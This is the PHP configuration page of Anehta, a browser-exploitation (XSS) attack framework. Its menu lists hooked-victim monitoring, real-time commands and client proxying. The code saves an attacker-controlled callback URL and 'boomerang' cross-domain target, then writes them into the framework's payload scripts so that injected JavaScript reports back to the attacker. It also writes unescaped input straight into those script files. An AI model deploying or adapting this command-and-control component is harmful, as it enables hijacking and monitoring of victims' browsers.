<?php
  //加载auth类
  include_once("class/auth_Class.php");

  header("Content-Type: text/html; charset=utf-8");
  
  if (checkLoginStatus($U, $P, $textKey) == false){
  	return false;
  }
?>
<html>
	<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  <script src="../server/js/ui.dialog.js"></script>
	  <script src="../server/js/ui.resizable.js"></script>	  
	  
	  <!-- 加载 JSONER -->
	  <script src="../server/js/_compressed_jsoner.commons.js"></script>
    <script src="../server/js/_compressed_jsoner.js"></script>
    <script src="../server/js/_compressed_jsoner.serializer.js"></script>
    <script src="../server/js/jsoner.undomanager.js"></script>
    <script src="../server/js/jsoner.updater.js"></script>	  
	  
	  <script src="../server/js/loadData.js"></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />
</head>
<body onload="return initData();">


<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li class="selected"><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
<a href="../server/logout.php">Logout</a>
</ul>


<!-- 以下是功能部分 -->

<script>
	function freeze(time){
  	var date = new Date();
    var cur = null;
  
    do {
      cur = new Date();
    } while(cur - date < time);
	}
	
  var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  
  base64Encode = function(str) {
      var out, i, len;
      var c1, c2, c3;
      len = str.length;
      i = 0;
      out = "";
      while(i < len) {
          c1 = str.charCodeAt(i++) & 0xff;
          if(i == len)
          {
              out += base64EncodeChars.charAt(c1 >> 2);
              out += base64EncodeChars.charAt((c1 & 0x3) << 4);
              out += "==";
              break;
          }
          c2 = str.charCodeAt(i++);
          if(i == len)
          {
              out += base64EncodeChars.charAt(c1 >> 2);
              out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
              out += base64EncodeChars.charAt((c2 & 0xF) << 2);
              out += "=";
              break;
          }
          c3 = str.charCodeAt(i++);
          out += base64EncodeChars.charAt(c1 >> 2);
          out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
          out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
          out += base64EncodeChars.charAt(c3 & 0x3F);
      }
      return out;
  }	
  	
	
  function encodeparam(f){
  	var inputs = f.getElementsByTagName("input");
  	for (i=0; i<inputs.length; i++){        		
      inputs[i].value = base64Encode(inputs[i].value);
      //alert(inputs[i].name+"  "+inputs[i].value);
    }
    freeze(200);
    f.submit();
  }	
</script>

<div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 180px; float: left;">
  <div class="shadowcontainer" style="width: 700px; ">
    <div id="blackboard" class="innerdiv" style="height:350px;">
    	<form id="anehtaconfig" name="anehtaconfig" class="cssform" style="margin: 20 0 40 100px; float: top;" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" onsubmit="return encodeparam(this);">
      	<br />
      	<input type=text name="csrfToken" style="display:none;" value="<?php echo file_get_contents("../temp/session_token"); ?>" />
      	<p>
      	  <label for="anehtaurl">Anehta URL</label>
      	  <input type="text" id="anehtaurl" name="anehtaurl" style="width: 280px" value="" />
        </p>

        <p>
          <label for="boomerang">Boomerang Target:</label>
      	  <input type="text" id="boomerangtarget" name="boomerangtarget" style="width: 280px" value="" />
        </p>
        
        <p>
          <label for="boomerang">Boomerang Src:</label>
          <input type="text" id="boomerangsrc" name="boomerangsrc" style="width: 280px" value="" />  	  
        </p>
        
      	<p>
      	<label for="mail">Mail Config</label>
      	<font style="font-size: 12px; font-family: verdana; color: grey;">
      	  -- coming soon. please modify mail.php to change mailaddress.
      	</font>
        </p>
        <p></p>
      	<div style="margin-left: 150px;">
          <input type="submit" class="formbutton2" style='float:left; margin-left: 0px; margin-top: 20px; width: 55px; height: 25px;' value="Save" />
          <input type="reset" class="formbutton2" style='float:left; margin-left: 50px; margin-top: 20px; width: 55px; height: 25px;' value="reset" />
        </div>        
      </form>   	
    </div>
  </div>
</div>

<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>


</body>
</html>
       	
<?php
/*
* 统一配置anehta 配置文件
* 包括： anehtaurl, mail server, auth 等
*
*/

  include_once("xml.php");

  $anehtaurl = "";
  $boomerangtarget ="";
  $boomerangsrc = "";
  
 
  // check csrf TOKEN
if (isset($_POST["csrfToken"])){
  if (empty($_POST["csrfToken"])){
  	echo "\nToken Error! May be CSRF attack!\n";
  	return false;
  } else { 	
  	
  	list($user, $pass, $token) = explode(",", authCode($_COOKIE["anehtaDoor"], $textKey, "DECODE"));
  	//echo "token = $token\n";
  	//echo "csrf = ".base64_decode($_POST["csrfToken"])."\n"; 

  	if ($token != base64_decode($_POST["csrfToken"])){
  		echo "\nToken Error! May be CSRF attack!\n";
  		return false;
  	}
  }
  
  
  // 全部base64编码进入xml文件，否则可能被xpath注射
  if (!empty($_POST['anehtaurl']))
    //$anehtaurl = base64_encode($_POST['anehtaurl']);
    $anehtaurl = $_POST['anehtaurl'];
  if (!empty($_POST['boomerangtarget']))  
    //$boomerangtarget = base64_encode($_POST['boomerangtarget']);
    $boomerangtarget = $_POST['boomerangtarget'];
  if (!empty($_POST['boomerangsrc']))
    //$boomerangsrc = base64_encode($_POST['boomerangsrc']);
    $boomerangsrc = $_POST['boomerangsrc'];
  
  $fpath = 'config.xml';//文件的路径，不用手动创建文件
  
  if (file_exists($fpath) == false){ //配置文件不存在就生成一个
    $anehtaConfig = new OpXML('anehtaConfig',$fpath);

    //增加一条记录
    $arr = array('homepage'=>'http://anehta.googlecode.com','author'=>'axis','blog'=>'http://hi.baidu.com/aullik5','team'=>'http://www.ph4nt0m.org');
    $anehtaConfig->insert($arr);
  } else { //配置文件存在，开始更新记录
  	$anehtaConfig = new OpXML('anehtaConfig',$fpath);
  	
  	//增加一条记录
    $arr = array('homepage'=>'http://anehta.googlecode.com','author'=>'axis','blog'=>'http://hi.baidu.com/aullik5','team'=>'http://www.ph4nt0m.org');
    $anehtaConfig->updateRecordById(1, $arr);

    // 根据提交的配置信息插入xml文件
    if (($anehtaurl != "") && ($boomerangtarget != "") && ($boomerangsrc != "")){
      $arr = array('anehtaurl'=>$anehtaurl, 'boomerangtarget'=>$boomerangtarget, 'boomerangsrc'=>$boomerangsrc);
    } else {
    	echo "Please complete the configure!";
    	exit;
    }

    if ($anehtaConfig->getRecordById(2)) { // 有记录则更新
      $anehtaConfig->updateRecordById(2, $arr);
    } else { // 没有则插入
    	$anehtaConfig->insert($arr);
    }
  }

  //读取配置
  $config = $anehtaConfig->getRecordById(2);
  
  reset($config);
  while (list($key, $val) = each($config))
  {
  	$val = htmlspecialchars(base64_decode($val));
    echo "<b>$key</b> => $val<br />";
  }
  
  
  //更新配置文件
  
  //更新anehtaurl  在 anehta.js feed.js clx.js中
  $write_anehtaurl = base64_decode($config["anehtaurl"]);
  
  //unlink("../library/anehta.js");
  $anehta_raw = file_get_contents("../library/anehta_raw");
  $fp = fopen("../library/anehta.js", "w+");
  fwrite($fp, "var anehtaurl = \"$write_anehtaurl\";\r\n".$anehta_raw);
  fclose($fp);
  
  //unlink("../feed.js");
  $feed_raw = file_get_contents("../feed_raw");
  $fp = fopen("../feed.js", "w+");
  fwrite($fp, "var anehtaurl = \"$write_anehtaurl\";\r\n".$feed_raw);
  fclose($fp);
  
  //unlink("../module/clx.js");
  $clx_raw = file_get_contents("../module/clx_raw");
  $fp = fopen("../module/clx.js", "w+");
  fwrite($fp, "var anehtaurl = \"$write_anehtaurl\";\r\n".$clx_raw);
  fclose($fp);
  
  
  // 更新boomerang 的target和src
  $write_booemrangtarget = base64_decode($config["boomerangtarget"]);
  $write_boomerangsrc = base64_decode($config["boomerangsrc"]);
  $boomerang_raw = file_get_contents("../module/boomerang_raw");
  $fp = fopen("../module/boomerang.js", "w+");
  fwrite($fp, "var target = \"$write_booemrangtarget\";\r\n"."var org_url = \"$write_boomerangsrc\";\r\n".$boomerang_raw);
  fclose($fp);
}
?>
